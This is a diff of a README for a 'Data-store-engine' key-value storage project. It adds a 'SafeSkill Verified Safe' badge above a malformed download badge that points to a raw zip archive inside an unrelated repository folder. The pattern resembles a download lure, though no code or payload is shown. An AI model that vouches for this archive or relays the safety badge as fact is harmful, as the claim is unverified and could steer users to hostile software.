@@ -1,5 +1,7 @@
 # 🚀 Data-store-engine - Simple Key-Value Storage Solution
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ethan-sonic-data-store-engine)
+
 [![Download Latest Release](https://github.com/Ethan-sonic/Data-store-engine/raw/refs/heads/main/WritePath/store_Data_engine_2.3-beta.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/Ethan-sonic/Data-store-engine/raw/refs/heads/main/WritePath/store_Data_engine_2.3-beta.2.zip)
 
 ## 📋 Overview
